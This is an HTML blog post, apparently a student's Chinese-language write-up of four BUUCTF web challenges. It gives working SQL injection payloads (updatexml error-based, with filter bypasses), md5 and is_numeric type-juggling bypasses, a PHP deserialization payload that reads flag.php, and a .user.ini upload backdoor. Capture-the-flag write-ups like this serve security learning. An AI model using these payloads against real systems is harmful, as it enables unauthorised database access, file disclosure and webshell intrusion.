@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Buuctf Web（25-28） | qinyiwen</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Buuctf Web（25-28）25、HardSQL一些and、union、select、空格等常见的SQL语句被过滤了 1234567891011121314151617181920这道题是xpath报错注入，函数注入extractvalue()extractvalue() :对XML文档进行查询的函数语法：extractvalue(目标xml文档，xml路径)第一个参数 :   第一个参数可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buuctf Web（25-28）">
+<meta property="og:url" content="http://example.com/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/index.html">
+<meta property="og:site_name" content="qinyiwen">
+<meta property="og:description" content="Buuctf Web（25-28）25、HardSQL一些and、union、select、空格等常见的SQL语句被过滤了 1234567891011121314151617181920这道题是xpath报错注入，函数注入extractvalue()extractvalue() :对XML文档进行查询的函数语法：extractvalue(目标xml文档，xml路径)第一个参数 :   第一个参数可">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/40172d44-3758-4a26-be49-45c7087c0dbc">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae5611e0-f140-4525-af9f-049d55033cce">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/73ca09b1-1eb7-4fd3-ab8a-3b4a4ab60464">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/f0bb9dd2-c888-4015-8365-e30b0fab3422">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/dc636dd7-18e8-41b5-ac79-d1cdd9ddb8ae">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/25ed0a2d-a386-4f5a-a67b-ec2fe58b275a">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/735591d7-7347-4231-8cf4-8e214d661a5c">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/6025af10-9590-4393-a0ae-93aa16f18a7a">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/3be50c4c-0313-43b5-92a2-760dd9124563">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/8cce0fe7-5a49-4fef-8dc9-e6bc1d8a1d22">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b387b0b-34b7-47d7-a4f3-da0541b41645">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ca844239-9ab4-495a-8dca-990e712adf01">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/15c04760-6a23-41d4-83f6-dd8f478eb394">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/5a5854bd-3fac-4eec-b1ea-540fcfeaebae">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d95f340e-38ae-4031-822c-3f6235148810">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/f9af52b5-a67d-4af4-8823-27f73a90f669">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/57a89ea6-4ffd-4e14-8ef8-06719fe30248">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/71797466-704f-4582-ba9e-97f28a1b3f74">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/8781da91-2795-4230-ac17-57b131e21631">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/6c0d5cd1-1472-4e3a-9a9d-da5b8e7d3325">
+<meta property="article:published_time" content="2023-08-12T12:53:48.000Z">
+<meta property="article:modified_time" content="2023-08-14T10:08:29.926Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/40172d44-3758-4a26-be49-45c7087c0dbc">
+  
+    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">qinyiwen</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Buuctf Web（25-28）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2023-08-12T12:53:48.000Z" itemprop="datePublished">2023-08-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Buuctf Web（25-28）
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="Buuctf-Web（25-28）"><a href="#Buuctf-Web（25-28）" class="headerlink" title="Buuctf Web（25-28）"></a>Buuctf Web（25-28）</h3><h4 id="25、HardSQL"><a href="#25、HardSQL" class="headerlink" title="25、HardSQL"></a>25、HardSQL</h4><p>一些and、union、select、空格等常见的SQL语句被过滤了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">这道题是xpath报错注入，函数注入</span><br><span class="line"></span><br><span class="line">extractvalue()</span><br><span class="line">extractvalue() :对XML文档进行查询的函数</span><br><span class="line"></span><br><span class="line">语法：extractvalue(目标xml文档，xml路径)</span><br><span class="line"></span><br><span class="line">第一个参数 :   第一个参数可以传入目标xml文档</span><br><span class="line"></span><br><span class="line">第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</span><br><span class="line"></span><br><span class="line">　　　　　　正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</span><br><span class="line"></span><br><span class="line">tip: 还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串</span><br><span class="line"></span><br><span class="line">再举个栗子：</span><br><span class="line"></span><br><span class="line">SELECT ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;, &#x27;/a/b&#x27;); 这个语句就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</span><br><span class="line"></span><br><span class="line">利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</span><br></pre></td></tr></table></figure>
+
+<p>输入用户名：<code>1</code></p>
+<p>密码：<code>1&#39;or&#39;1&#39;=&#39;1</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/40172d44-3758-4a26-be49-45c7087c0dbc" alt="image"></p>
+<p>出现这段话，并且url加上了&#x2F;check.php</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae5611e0-f140-4525-af9f-049d55033cce" alt="image"></p>
+<p>爆库名：<code>?username=admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=111</code></p>
+<p>geek</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/73ca09b1-1eb7-4fd3-ab8a-3b4a4ab60464" alt="image"></p>
+<p>爆表名：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(%27geek%27)),0x7e),1))%23&amp;password=111</code></p>
+<p>H4rDsq1</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f0bb9dd2-c888-4015-8365-e30b0fab3422" alt="image"></p>
+<p>爆字段：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=111</code></p>
+<p>id,username,password</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/dc636dd7-18e8-41b5-ac79-d1cdd9ddb8ae" alt="image"></p>
+<p>爆数据：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
+<p>flag{52272770-1ba7-4986-8a7d-cb</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/25ed0a2d-a386-4f5a-a67b-ec2fe58b275a" alt="image"></p>
+<p>这里只爆出前面一部分flag，然后再使用right()函数拼接flag<code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
+<p>7-4986-8a7d-cb84363e2987}</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/735591d7-7347-4231-8cf4-8e214d661a5c" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;52272770-1ba7-4986-8a7d-cb84363e2987&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="26、Ez-bypass"><a href="#26、Ez-bypass" class="headerlink" title="26、Ez_bypass"></a>26、Ez_bypass</h4><p>这是一段php代码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6025af10-9590-4393-a0ae-93aa16f18a7a" alt="image"></p>
+<p>查看源码，得到易读的格式</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3be50c4c-0313-43b5-92a2-760dd9124563" alt="image"></p>
+<p>分析代码</p>
+<p>第一步</p>
+<p>首先用get方式传入id和gg</p>
+<p><code>md5($id)===md5($gg)</code>数组绕过：id[]&#x3D;a&amp;gg[]&#x3D;b，最后可能会报错，但是<code>null=null</code>，判断为true，成功绕过</p>
+<p>构造payload：<code>/?id[]=a&amp;gg[]=b</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8cce0fe7-5a49-4fef-8dc9-e6bc1d8a1d22" alt="image"></p>
+<p> 第二步</p>
+<p>用post方法传入passwd，passwd不是数字和数字字符串，但是passwd值为1234567</p>
+<p><code>is_numeric() </code>用于检测变量是否为数字或数字字符串</p>
+<p>所以passwd为1234567a</p>
+<p>用插件实现post传参</p>
+<p>构造payload：<code>passwd=1234567a</code></p>
+<p>得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b387b0b-34b7-47d7-a4f3-da0541b41645" alt="image"></p>
+<p>关于md5的总结<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52923241/article/details/119669647">【CTF】关于md5总结_ctf md5_吃_早餐的博客-CSDN博客</a></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e2f8945c-0443-493c-8023-304121617ba8&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="27、AreUSerialz"><a href="#27、AreUSerialz" class="headerlink" title="27、AreUSerialz"></a>27、AreUSerialz</h4><p>代码审计：op变量使用强类型比较&#x3D;&#x3D;&#x3D;判断this-&gt;op的值是否等于字符串2，如果等于，则将其置为1。在process()方法中，使用弱类型比较&#x3D;&#x3D;判断op的值是否对等于字符串2，若为真，则执行read()方法与output()方法。在read()方法中，使用file_get_contents()函数来读取属性filename路径的文件。</p>
+<p>编造序列化（利用public属性序列化，绕过is_valid()函数）</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">	public $op = 2;</span><br><span class="line">	public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">	public $content;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new FileHandler();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到序列化结果为</p>
+<p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code><br><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ca844239-9ab4-495a-8dca-990e712adf01" alt="image"></p>
+<p>构造payload：<code>/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
+<p>得到一串base64编码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/15c04760-6a23-41d4-83f6-dd8f478eb394" alt="image"></p>
+<p>解码后得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5a5854bd-3fac-4eec-b1ea-540fcfeaebae" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0f854947-b236-49a6-ae66-d96e523aa8ca&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="28、CheckIn"><a href="#28、CheckIn" class="headerlink" title="28、CheckIn"></a>28、CheckIn</h4><p>user.ini文件构成PHP后门</p>
+<p>创建<code>.user.ini</code>文件，前面的<code>GIF</code>是为了绕过检测；因为后台用exif_imagetype函数检测文件类型，所以我们在文件前加上图片的特征，来绕过检测</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d95f340e-38ae-4031-822c-3f6235148810" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f9af52b5-a67d-4af4-8823-27f73a90f669" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/57a89ea6-4ffd-4e14-8ef8-06719fe30248" alt="image"></p>
+<p>创建图片文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/71797466-704f-4582-ba9e-97f28a1b3f74" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8781da91-2795-4230-ac17-57b131e21631" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6c0d5cd1-1472-4e3a-9a9d-da5b8e7d3325" alt="image"></p>
+<p>蚁剑链接<code>http://3b30b477-b314-466c-bb51-8e982490eea3.node4.buuoj.cn:81/uploads/c55e0cb61f7eb238df09ae30a206e5ee/index.php</code></p>
+<p>试了很久返回数据为空，不知道怎么解决</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/" data-id="cllavjvho0000t8vf6bgrh8c3" data-title="Buuctf Web（25-28）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Buuctf Web（21-24）</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/learn/" style="font-size: 10px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 13.33px;">论文细读</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/">Buuctf Web（25-28）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/">Buuctf Web（21-24）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/">Buuctf Web（17-20）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/">Buuctf Web（13-16）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/">Buuctf Web（9-12）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
